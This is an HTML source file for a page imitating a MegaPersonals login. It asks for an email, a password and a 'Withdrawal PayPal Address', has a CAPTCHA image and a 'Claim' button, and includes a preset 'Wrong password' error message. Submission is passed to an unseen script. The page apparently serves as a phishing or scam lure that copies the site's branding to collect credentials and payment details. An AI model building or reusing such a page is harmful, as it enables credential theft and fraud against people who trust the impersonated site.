<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MegaPersonals Login</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <img src="logo.png" class="logo" alt="MegaPersonals Logo" />

    <h2>MegaPersonals login</h2>

    <form onsubmit="event.preventDefault(); handleClaim();">
      <input type="text" id="email" placeholder="Email" required />

      <div class="password-wrapper">
        <input type="password" id="password" placeholder="Password" required />
        <span id="togglePassword" class="toggle-password">Show</span> <!-- updated here -->
        <div id="passwordError" class="error-msg">Wrong password</div>
      </div>

      <label class="paypal-label">Withdrawal PayPal Address</label>
      <input type="text" id="paypal" placeholder="PayPal Email Address" required />

      <div class="captcha-group">
        <img src="captcha.jpg" alt="CAPTCHA" class="captcha" />
        <img src="reload.png" alt="Reload" class="reload" />
      </div>
      <input type="text" id="captchaInput" placeholder="Enter code from the picture" required />

      <button type="submit" class="claim-btn">Claim</button>
    </form>

    <footer>Copyright Â© 2025 MegaPersonals.eu</footer>
  </div>

  <script src="script.js"></script>
</body>
</html>
